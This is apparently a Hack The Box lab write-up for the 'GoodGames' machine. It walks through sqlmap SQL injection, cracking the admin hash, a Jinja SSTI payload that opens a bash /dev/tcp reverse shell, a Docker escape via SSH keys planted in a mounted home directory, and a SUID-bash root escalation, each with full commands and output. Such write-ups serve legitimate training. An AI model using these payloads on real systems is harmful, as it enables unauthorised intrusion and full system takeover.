# Target
| Category          | Details                                              |
|-------------------|------------------------------------------------------|
| 📝 **Name**       | [GoodGames](https://app.hackthebox.com/machines/446) |  
| 🏷 **Type**       | HTB Machine                                          |
| 🖥 **OS**         | Linux                                                |
| 🎯 **Difficulty** | Easy                                                 |
| 📁 **Tags**       | python, Flask, SQLi, SSTI, docker                    |

# Scan
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.9.2)
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
```

# Attack path
1. [Discover admin credentials by exploiting SQLi in web application login panel](#discover-admin-credentials-by-exploiting-sqli-in-web-application-login-panel)
2. [Gain initial foothold by exploiting SSTI in `internal-administration` web application](#gain-initial-foothold-by-exploiting-ssti-in-internal-administration-web-application)
3. [Escape from Docker container to host using SSH with generated private key](#escape-from-docker-container-to-host-using-ssh-with-generated-private-key)
4. [Escalate to `root` user using root shell with SUID flag set from within Docker container](#escalate-to-root-user-using-root-shell-with-suid-flag-set-from-within-docker-container)

### Discover admin credentials by exploiting SQLi in web application login panel

#### Add `goodgames.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB GoodGames]
└─$ echo "$TARGET goodgames.htb" | sudo tee -a /etc/hosts
10.129.82.210 goodgames.htb
```

#### List databases using SQLi in web application login panel
Request obtained with Burp.
```
┌──(magicrc㉿perun)-[~/attack/HTB GoodGames]
└─$ sqlmap -r login.http --batch --level 3 --dbs
<SNIP>
available databases [2]:
[*] information_schema
[*] main
```

#### List tables in `main` database
```
┌──(magicrc㉿perun)-[~/attack/HTB GoodGames]
└─$ sqlmap -r login.http --batch --level 3 -D main --tables
Database: main
[3 tables]
+---------------+
| user          |
| blog          |
| blog_comments |
+---------------+
```

#### Dump `main.users` table
```
┌──(magicrc㉿perun)-[~/attack/HTB GoodGames]
└─$ sqlmap -r login.http --batch --level 3 -D main -T user --dump
<SNIP>
Database: main                                                                                                                         
Table: user
[1 entry]
+----+---------------------+---------+-----------------------------------------+
| id | email               | name    | password                                |
+----+---------------------+---------+-----------------------------------------+
| 1  | admin@goodgames.htb | admin   | 2b22337f218b2d82dfc3b6f77e7cb8ec        |
+----+---------------------+---------+-----------------------------------------+
```

#### Crack password for `admin@goodgames.htb`
```
┌──(magicrc㉿perun)-[~/attack/HTB GoodGames]
└─$ hashcat -m 0 '2b22337f218b2d82dfc3b6f77e7cb8ec' /usr/share/wordlists/rockyou.txt --quiet
2b22337f218b2d82dfc3b6f77e7cb8ec:superadministrator
```

#### Discover `internal-administration.goodgames.htb` after loging as `admin@goodgames.htb`
```
┌──(magicrc㉿perun)-[~/attack/HTB GoodGames]
└─$ echo "$TARGET internal-administration.goodgames.htb" | sudo tee -a /etc/hosts
10.129.82.210 internal-administration.goodgames.htb
```

### Gain initial foothold by exploiting SSTI in `internal-administration` web application

#### Discover `internal-administration` is a python based application
```
┌──(magicrc㉿perun)-[~/attack/HTB GoodGames]
└─$ curl -I http://internal-administration.goodgames.htb     
HTTP/1.1 302 FOUND
Date: Wed, 22 Oct 2025 08:58:37 GMT
Server: Werkzeug/2.0.2 Python/3.6.7
Content-Type: text/html; charset=utf-8
Content-Length: 218
Location: http://internal-administration.goodgames.htb/login
```

#### Start `netcat` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB GoodGames]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

#### Exploit SSTI in `name` parameter of `POST /settings` endpoint to spawn reverse shell
`superadministrator` password has been reused to access web application.
```
┌──(magicrc㉿perun)-[~/attack/HTB GoodGames]
└─$ LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1) && \
LPORT=4444 && \
REVERSE_SHELL=$(echo -n "/bin/bash -c \"bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\"" | jq -sRr @uri) && \
CSRF_TOKEN=$(curl -s http://internal-administration.goodgames.htb/login | grep -oP 'value="\K[^"]+') && \
curl -s -c cookies.txt http://internal-administration.goodgames.htb/login -d "csrf_token=$CSRF_TOKEN&username=admin&password=superadministrator&login=" -o /dev/null && \
curl -s -b cookies.txt http://internal-administration.goodgames.htb/settings -d "name={{request.application.__globals__.__builtins__.__import__('os').popen('$REVERSE_SHELL').read()}}"
```

#### Confirm foothold gained
```
connect to [10.10.16.23] from (UNKNOWN) [10.129.82.210] 49038
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3a453ab39d3d:/backend# id
uid=0(root) gid=0(root) groups=0(root)
```

### Escape from Docker container to host using SSH with generated private key

#### Stabilise reverse shell
```
root@3a453ab39d3d:/backend# python -c 'import pty; pty.spawn("/bin/bash")'
```

#### Confirm foothold gained on unprivileged Docker container
```
root@3a453ab39d3d:/backend# cat /proc/1/cgroup
11:pids:/docker/3a453ab39d3df444e9b33e4c1d9f2071827b3b7b20a8d3357b7754a84b06685f
10:perf_event:/docker/3a453ab39d3df444e9b33e4c1d9f2071827b3b7b20a8d3357b7754a84b06685f
9:devices:/docker/3a453ab39d3df444e9b33e4c1d9f2071827b3b7b20a8d3357b7754a84b06685f
8:memory:/docker/3a453ab39d3df444e9b33e4c1d9f2071827b3b7b20a8d3357b7754a84b06685f
7:net_cls,net_prio:/docker/3a453ab39d3df444e9b33e4c1d9f2071827b3b7b20a8d3357b7754a84b06685f
6:rdma:/
5:cpuset:/docker/3a453ab39d3df444e9b33e4c1d9f2071827b3b7b20a8d3357b7754a84b06685f
4:blkio:/docker/3a453ab39d3df444e9b33e4c1d9f2071827b3b7b20a8d3357b7754a84b06685f
3:freezer:/docker/3a453ab39d3df444e9b33e4c1d9f2071827b3b7b20a8d3357b7754a84b06685f
2:cpu,cpuacct:/docker/3a453ab39d3df444e9b33e4c1d9f2071827b3b7b20a8d3357b7754a84b06685f
1:name=systemd:/docker/3a453ab39d3df444e9b33e4c1d9f2071827b3b7b20a8d3357b7754a84b06685f
0::/system.slice/containerd.service

root@3a453ab39d3d:/backend# cat /proc/1/status | grep -i "seccomp"
Seccomp:        2
```

#### Discover Docker host `augustus` user home directory is mounted on container
```
root@3a453ab39d3d:/backend# mount
<SNIP>
/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
<SNIP>

root@3a453ab39d3d:/backend# ls -la /home/augustus
total 24
drwxr-xr-x 2 1000 1000 4096 Oct 22 08:38 .
drwxr-xr-x 1 root root 4096 Nov  5  2021 ..
lrwxrwxrwx 1 root root    9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000  220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 1000 1000 3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 1000 1000  807 Oct 19  2021 .profile
-rw-r----- 1 root 1000   33 Oct 22 06:55 user.txt
```

#### Generate SSH private key for Docker host `augustus` user
```
root@3a453ab39d3d:/backend# mkdir /home/augustus/.ssh && \
ssh-keygen -t rsa -b 4096 -f /home/augustus/.ssh/id_rsa -N "" && \
cat /home/augustus/.ssh/id_rsa.pub >> /home/augustus/.ssh/authorized_keys && \
chmod 700 /home/augustus/.ssh && chmod 600 /home/augustus/.ssh/* && \
chown -R 1000:1000 /home/augustus/.ssh
Generating public/private rsa key pair.
Your identification has been saved in /home/augustus/.ssh/id_rsa.
Your public key has been saved in /home/augustus/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:7mDduu0mCDHX6SdhaBIGdpQiaqmPsWRSqoHiGvsq79A root@3a453ab39d3d
The key's randomart image is:
+---[RSA 4096]----+
|  ooo.           |
|....+            |
|...o . o .       |
|.o. + + =        |
|+o   * oS.       |
|O+  .  oo..      |
|X*E  .o.oo.      |
|==.  ..o.o.      |
|*=+     +=o      |
+----[SHA256]-----+
```

#### Obtain IP address of gateway which will be address of a Docker host
```
root@3a453ab39d3d:/backend# netstat -rn
Kernel IP routing table
Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
0.0.0.0         172.19.0.1      0.0.0.0         UG        0 0          0 eth0
172.19.0.0      0.0.0.0         255.255.0.0     U         0 0          0 eth0
```

#### Breakout to Docker host using generated SSH private key
```
root@3a453ab39d3d:/backend# ssh augustus@172.19.0.1 -i /home/augustus/.ssh/id_rsa
<SNIP>
augustus@GoodGames:~$ id
uid=1000(augustus) gid=1000(augustus) groups=1000(augustus)
```

### Escalate to `root` user using root shell with SUID flag set from within Docker container

#### Prepare root shell by coping `/bin/bash`
```
augustus@GoodGames:~$ cp /bin/bash root_shell
augustus@GoodGames:~$ ls -l root_shell
-rwxr-xr-x 1 augustus augustus 1234376 Oct 22 15:51 root_shell
```

#### Change `root_shell` owner to `root:root` and set SUID flag from Docker container
```
root@3a453ab39d3d:/backend# chown root:root /home/augustus/root_shell && chmod +s /home/augustus/root_shell
```

#### Spawn root shell from Docker host
```
augustus@GoodGames:~$ ./root_shell -p
root_shell-5.1# id
uid=1000(augustus) gid=1000(augustus) euid=0(root) egid=0(root) groups=0(root),1000(augustus)
```
